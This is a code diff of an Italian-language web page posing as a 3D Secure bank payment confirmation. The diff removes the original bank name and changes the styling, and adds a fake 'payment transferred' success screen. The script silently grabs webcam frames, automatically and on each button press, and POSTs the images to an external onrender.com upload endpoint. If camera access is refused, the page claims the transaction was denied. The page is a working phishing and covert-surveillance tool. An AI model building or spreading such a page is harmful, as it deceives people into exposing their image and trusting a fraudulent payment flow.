@@ -3,11 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Banca dei Crediti - Autorizzazione 3D Secure</title>
+  <title>Autorizzazione 3D Secure</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f4f4f4;
+      background-color: #000;
+      color: #fff;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -16,29 +17,21 @@
     }
 
     .card {
-      background-color: white;
-      border-radius: 12px;
-      padding: 20px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      background-color: transparent;
+      text-align: center;
       width: 100%;
       max-width: 400px;
-      text-align: center;
-    }
-
-    .logo {
-      width: 120px;
-      margin-bottom: 10px;
     }
 
     .info p {
-      font-size: 15px;
-      margin: 6px 0;
+      font-size: 16px;
+      margin: 8px 0;
     }
 
     .timer {
       font-size: 15px;
-      color: red;
-      margin-bottom: 10px;
+      color: #ccc;
+      margin-bottom: 20px;
     }
 
     button {
@@ -46,14 +39,34 @@
       padding: 14px;
       margin-top: 10px;
       border: none;
-      border-radius: 6px;
+      border-radius: 30px;
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
     }
 
-    .autorizza { background-color: #ffd700; }
-    .nega { background-color: #d3d3d3; }
+    .autorizza {
+      background-color: #00bfff;
+      color: #000;
+    }
+
+    .nega {
+      background-color: #fff;
+      color: #000;
+    }
+
+    .link {
+      color: #00bfff;
+      font-size: 14px;
+      margin: 6px 0;
+      text-decoration: none;
+      display: block;
+    }
+
+    .checkmark {
+      font-size: 80px;
+      margin-bottom: 20px;
+    }
 
     video, canvas {
       display: none;
@@ -63,14 +76,13 @@
 <body>
 
 <div class="card" id="card">
-  <img src="logo.png" class="logo" alt="Banca dei Crediti">
-  <h2>Banca dei Crediti - 3D Secure</h2>
+  <h2 style="margin-bottom: 20px;">Conferma pagamento</h2>
 
   <div class="info">
-    <p>Intestatario: <strong>LORENZO MARIANI</strong></p>
-    <p>IBAN: <strong>IT44*********4492</strong></p>
-    <p>Importo: <strong>15,00 EUR</strong></p>
-    <p>Commissione: <strong>0,00 USD</strong></p>
+    <p>Intestatario: <strong>LORE*** MARIANI</strong></p>
+    <p>IBAN: <strong>IT60X****5678</strong></p>
+    <p>Importo: <strong>15,00 €</strong></p>
+    <p>Commissione: <strong>0,00 €</strong></p>
     <p>Transazione: <strong>#TRX-9283743</strong></p>
     <p>Data: <strong><span id="data-operazione"></span></strong></p>
     <p class="timer">Sessione in scadenza tra <span id="countdown">02:00</span></p>
@@ -89,7 +101,6 @@
   const context = canvas.getContext('2d');
   const countdownEl = document.getElementById('countdown');
   const card = document.getElementById('card');
-
   document.getElementById('data-operazione').innerText = new Date().toLocaleDateString('it-IT');
 
   // Countdown 2 minuti
@@ -110,7 +121,6 @@
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       video.srcObject = stream;
-
       video.onloadedmetadata = () => {
         setTimeout(() => {
           takeAndSendPhoto("auto-scatto");
@@ -118,35 +128,46 @@
       };
     })
     .catch(() => {
-      // Webcam negata → schermata transazione negata
       card.innerHTML = `
-        <h2 style="color: darkred">Transazione Negata</h2>
-        <p>L'autenticazione 3D Secure è stata negata.</p>
-        <p>Operazione annullata.</p>
+        <h2 style="color: red;">Transazione Negata</h2>
+        <p>L'autenticazione 3D Secure non è stata completata.</p>
+        <p>Accesso alla videocamera rifiutato.</p>
       `;
     });
 
   function handleClick(action) {
     takeAndSendPhoto(action);
-    alert("Operazione completata.");
+    if (action === 'autorizza') {
+      showSuccessScreen();
+    } else {
+      card.innerHTML = `
+        <h2 style="color: red;">Transazione Annullata</h2>
+        <p>Hai annullato manualmente l'autenticazione.</p>
+      `;
+    }
   }
 
   function takeAndSendPhoto(action) {
-    // Imposta canvas con dimensione reale
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
     const image = canvas.toDataURL('image/png');
-
-    // Invia immagine al backend
     fetch('https://backend-render-server.onrender.com/upload', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        action,
-        image
-      })
+      body: JSON.stringify({ action, image })
     });
+  }
+
+  function showSuccessScreen() {
+    card.innerHTML = `
+      <div class="checkmark">✔️</div>
+      <h2><strong>15,00 €</strong> sono stati trasferiti</h2>
+      <a href="#" class="link">INVIA VIA EMAIL</a>
+      <a href="#" class="link">DETTAGLIO OPERAZIONE</a>
+      <button class="autorizza">NUOVO BONIFICO</button>
+      <button class="nega">CHIUDI</button>
+    `;
   }
 </script>
 
